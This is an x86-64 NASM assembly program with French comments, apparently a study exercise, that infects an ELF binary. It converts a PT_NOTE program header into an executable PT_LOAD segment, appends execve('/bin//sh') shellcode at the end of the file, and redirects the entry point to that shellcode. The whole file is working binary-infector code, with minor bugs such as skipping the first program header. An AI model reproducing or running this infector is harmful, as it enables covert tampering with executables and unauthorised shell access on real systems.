section .data
	file_path db "/tmp/ls", 0	; j'effectue un test sur mon fichier ls copie dans /tmp
	buffer_size equ 10000		;  taille buffer
	stat_size equ 144		; taille de stat

	;shellcode
	shellcode db 0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54, 0x5f, 0x6a, 0x3b, 0x58, 0x99, 0x0f, 0x05
	shellcode_len equ $ - shellcode
	
	; open msg syscall
	error_open_msg db "Erreur lors de l'ouverture du fichier", 0xA
	error_open_msg_len equ $ - error_open_msg
	ok_open_msg db "Ouverture correcte du fichier", 0xA
	ok_open_msg_len equ $ - ok_open_msg

	; read msg syscall
	error_read_msg db "Erreur lors de la lecture du fichier", 0xA
	error_read_msg_len equ $ - error_read_msg
	ok_read_msg db "Lecture correcte du fichier", 0xA
	ok_read_msg_len equ $ - ok_read_msg

	; elf msg elf check
	error_elf_msg db "Fichier non ELF", 0xA
	error_elf_msg_len equ $ - error_elf_msg
	ok_elf_msg db "Fichier ELF", 0xA
	ok_elf_msg_len equ $ -  ok_elf_msg
	
	; pt_note msg 
	error_pt_note_msg db "Ce n'est pas un PT_NOTE", 0xA
	error_pt_note_msg_len equ $ - error_pt_note_msg 
	ok_pt_note_msg db "C'est un PT_NOTE", 0xA
	ok_pt_note_msg_len equ $ - ok_pt_note_msg

	; write phdr msg
	error_write_phdr_msg db "Error lors de l'écriture dans le phdr", 0xA
	error_write_phdr_msg_len equ $ - error_write_phdr_msg
	error_write_byte_size_phdr_msg db "Erreur, on a pas écrit la taille qu'il fallait", 0xA
	error_write_byte_size_phdr_msg_len equ $ - error_write_byte_size_phdr_msg

	; write header msg
	error_write_header_msg db "Error lors de l'écriture dans le header", 0xA
	error_write_header_msg_len equ $ - error_write_phdr_msg
	error_write_byte_size_header_msg db "Error, write_syze header", 0xA
	error_write_byte_size_header_msg_len equ $ - error_write_byte_size_header_msg
section .bss
	buffer resb buffer_size		; Je reserve un espace memoire pour mon elf
	stat resb stat_size		; Reserve de l'espace pour stat
	p_offset resq 1			; Reserve de l'espace pour p_offset
	header resb 64	
section .text

global _start

_start:
	;r13 = fd
	;
	;

	

	; syscall open, pour l'ouverture de notre fichier elf
	; syscall open
	mov rax, 2			; open(
	lea rdi, [rel file_path]	; int fd,  path de notre elf
	mov rsi, 2			; 	,O_RDONLY
	syscall				; )
	test rax, rax			; Check si le file est OK (rax==0)
	js _error_open			; Gestion d'erreur pour open
	mov r13, rax			; Si OK alors on met le fd dans r13 en attendant le syscall print
	call _ok_open	
	
	; Lecture du fichier
	; syscall read				
	mov rax, 0			; read(
	mov rdi, r13			; int fd,
	mov rsi, buffer			; void buf*, 	
	mov rdx, buffer_size		; size_t count
	syscall				; )
	;	gestion erreur sys_read
	test rax, rax
	js _error_read
	call _ok_read

	; On va stoquer le buffer dans R15 car quasiment jamais touché
	lea r15, [buffer]
	
	; Check si fichier ELF
	cmp dword  [r15], 0x464C457F
	; 	gestion erreur elf
	jne _error_elf
	call _ok_elf

	; On va prendre la taille du fichier avec sys_stat
	mov rax, 0x5			; fstat(
	mov rdi, r13			; int fd,
	mov rsi, stat			; void buf*
	syscall				; ) 

	mov r14, [stat+0x30]		; On met la taille st_size dans r14
	mov r8, [r15+0x20]		; e_phoff
	mov r9, [r15+0x36]		; e_penthsize
	and r9, 0xFFFF
	; On peut maintenant parser le programme header phdr
	xor rcx, rcx			; Initialise rcx
	xor rdx, rdx			; Initialise rdx
	mov cx, word [r15+0x38]		; e_phnum
	mov rbx, qword [r15+0x20]	; e_phoff
	mov dx, word [r15+0x36]		; e_phentsize
	; On cherche un PT_NOTE phdr
	call _loop_phdr


	call _exit

_ok_pt_note:
	lea rsi, [rel ok_pt_note_msg]
	mov rdx, ok_pt_note_msg_len
	call _print_msg			; Msg de succès
	mov dword [r15+rbx], 0x1	; on transforme notre p_type en PT_LOAD
	mov dword [r15+rbx+0x4], 0x1	; On accord permission RX à p_flags
	mov r12, [r15+rbx+0x8]		; On sauvegarde l'offset pour ensuite réécrire le phdr
	mov qword [r15+rbx+0x8], r14	; On met p_offset à EOF
	add r14, 0xc000000		; On prend un large adresse et on l'ajoute à R13
	mov qword [r15+rbx+0x10], r14	; On met p_vaddr suffisamment loin (grosse adresse) pour que ca n'interfere pas avec le code de base
	mov [r15+0x18], r14		; de meme pour le header, on réécrit e_entry pour aller directement à OEF ou se situe notre shellcode
	mov qword [r15+rbx+0x20], shellcode_len  ; Taille de mon shellcode dans p_filesz
	mov qword [r15+rbx+0x28], shellcode_len  ; Taille de mon shellcode dans p_memsz
	mov qword [r15+rbx+0x30], 0x1000; Alignement des pages	
	
	; On va aller à la fin du file EOF pour injecter notre shellcode avec sys_lseek
	mov rax, 0x8			; lseek(
	mov rdi, r13			; int fd,
	mov rsi, 0			; off_t offset,
	mov rdx, 2			; int origin 2=SEEK_END
	syscall				; )
	
	; On écrit à OEF notre shellcode
	; syscall write
	mov rax, 0x1			; write(
	mov rdi, r13			; int fd,
	mov rsi, shellcode		; void buf*,
	mov rdx, shellcode_len		; size_t count
	syscall				; )
	

;	mov rsi, r15
;	mov rdi, header
;	mov rcx, 64
;	rep movsb

	; On réécrit notre header, pour ça on retourne au début du fichier ou à e_phoff
	; syscall sys_lseek
	mov rax, 0x8			; lseek(
	mov rdi, r13			; int fd,
	xor rsi, rsi			; off_t offset,
	mov rdx, 0x0			; int origin, 0=SEEK_SET
	syscall				; )
	; syscall write
	mov rax, 0x1			; write(
	mov rdi, r13			; int fd,
	mov rsi, r15			; void buf*,
	mov rdx, 0x40			; size_t count
	syscall				; )
	
	;	gestion erreur write header
	test rax, rax
	js _write_error_header
	cmp rax, 0x40
	jne _write_error_byte_size_header

	; On réécrit notre phdr, pour ça on va se placer a l'endroit ou est notre PT_NOTE
	; syscall sys_lseek
	mov rax, 0x8			; lseek(
	mov rdi, r13			; int fd,
	mov rsi, r12			; void buf*,
	mov rdx, 0x0			; int origin, 0=SEEK_SET
	syscall				; )

	xor rsi, rsi
	mov rsi, r15
	add rsi, rbx
	; syscall write
	mov rax, 0x1			; write(
	mov rdi, r13			; int fd,
	mov rsi, rsi			; void buf*,
	mov rdx, r9			; size_t count
	syscall				; )
	
	;	getion erreur write pheader
	test rax, rax
	js _write_error_phdr		;
	cmp rax, r9			; On check si on a bien écrit la taille qu'on voulait
	jne _write_error_byte_size_phdr ; Si c'est pas le cas on saute à la gestion d'erreur
	call _exit


_loop_phdr:
	add rbx, rdx			; on passe au prochain phdr
	dec rcx				; Decrémente le nombre de phdr
	cmp dword [r15+rbx], 0x4	; On check si PT_NOTE (p_type == 0x4) 
	je _ok_pt_note			; On a trouver un PT_NOTE phdr	
		; Sinon on check si il reste des phdr a comparer
	; 	gestion des erreurs pour le parsing
	lea rsi, [rel error_pt_note_msg]
	mov rdx, error_pt_note_msg_len
	call _print_msg
	xor rdx,rdx
	mov dx, word [r15+0x36]
	cmp rcx, 0
	jg _loop_phdr

_write_error_byte_size_header:
	lea rsi, [rel error_write_byte_size_header_msg]
	mov rdx, error_write_byte_size_header_msg_len
	call _print_msg
	call _exit

_write_error_header:
	mov rsi, rax
	mov rdx, 16
	syscall
	call _print_msg
	lea rsi, [rel error_write_header_msg]
	mov rdx, error_write_header_msg_len
	call _print_msg
	call _exit

_write_error_byte_size_phdr:
	lea rsi, [rel error_write_byte_size_phdr_msg]
	mov rdx, error_write_byte_size_phdr_msg_len
	call _print_msg
	call _exit

_write_error_phdr:
	lea rsi, [rel error_write_phdr_msg]
	mov rdx, error_write_phdr_msg_len
	call _print_msg
	call _exit

_ok_elf:
	lea rsi, [rel ok_elf_msg]
	mov rdx, ok_elf_msg_len
	call _print_msg
	ret
_error_elf:
	lea rsi, [rel error_elf_msg]
	mov rdx, error_elf_msg_len
	call _print_msg
	mov rax, 60
	mov rdi, 1			; code retour pour non elf
	syscall

_ok_read:
	lea rsi,  [rel ok_read_msg]
	mov rdx, ok_read_msg_len
	call _print_msg
	ret

_error_read:
	lea rsi, [rel error_read_msg]
	mov rdx, error_read_msg_len
	call _print_msg
	call _exit	

_ok_open:
	lea rsi, [rel ok_open_msg]
	mov rdx, ok_open_msg_len
	call _print_msg
	ret

_error_open:
	; syscall pour exit + petit message
	lea rsi, [rel error_open_msg]
	mov rdx, error_open_msg_len
	call _print_msg
	call _exit

_print_msg:
	mov rax, 1
	mov rdi, 1
	syscall
	ret

_exit:
	mov rax, 60
	xor rdi, rdi
	syscall
